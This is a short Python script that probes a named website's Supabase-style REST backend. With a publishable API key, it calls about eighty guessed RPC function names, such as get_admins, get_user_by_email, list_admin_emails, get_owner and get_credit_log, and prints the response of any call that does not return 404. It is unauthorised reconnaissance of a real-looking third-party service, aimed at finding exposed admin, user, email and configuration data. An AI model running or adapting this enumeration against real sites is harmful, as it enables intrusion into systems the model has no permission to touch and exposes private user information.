import ssl, json, urllib.request, urllib.error

BASE = "https://cdn.onlyfakeai.ru"
KEY = "<publishable-key>"
ctx = ssl.create_default_context()

def rpc(name, body=None, token=None):
    h = {"User-Agent": "Mozilla/5.0", "apikey": KEY,
         "Authorization": f"Bearer {token or KEY}",
         "Content-Type": "application/json;charset=UTF-8"}
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(f"{BASE}/rest/v1/rpc/{name}", data=data, headers=h, method="POST")
    try:
        with urllib.request.urlopen(r, timeout=20, context=ctx) as resp:
            return resp.status, resp.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "ignore")
    except Exception as e:
        return 0, str(e)

names = [
    "get_admins", "list_admins", "get_admin_list", "admin_list",
    "fetch_admins", "get_users", "list_users", "get_user_list",
    "get_profiles", "list_profiles", "get_profile", "get_user",
    "get_user_by_email", "find_user", "lookup_user", "search_users",
    "search_profiles", "get_admin_stats", "get_stats", "site_stats",
    "get_counts", "counts", "get_business_counts", "business_counts",
    "get_dashboard_stats", "dashboard_stats", "get_admin_emails",
    "list_admin_emails", "get_support_email", "get_contact",
    "get_owner", "owner_info", "get_site_config", "site_config",
    "get_config", "config", "get_settings", "settings",
    "get_plans", "list_plans", "plans", "get_plan_list",
    "get_prices", "prices", "get_products", "products",
    "get_catalog", "catalog", "get_countries", "countries",
    "get_job_status", "job_status", "get_job", "get_jobs",
    "get_recent_jobs", "recent_jobs", "get_user_jobs",
    "get_job_counts", "job_counts", "get_activity", "activity",
    "get_admin_activity", "admin_activity", "get_credit_log",
    "credit_log", "get_credits", "get_credit_balance",
    "get_balance", "balance", "get_profile_credits",
    "get_generations", "generations_left", "get_usage",
    "usage", "get_user_usage", "user_usage", "get_analytics",
    "analytics", "get_metrics", "metrics",
]
for n in names:
    st, txt = rpc(n)
    flag = ""
    if st != 404:
        flag = " <<<<<<<<"
    print(f"{n} -> {st}{flag}")
    if st != 404:
        print("   ", txt[:300].replace("\n", " ")[:300])
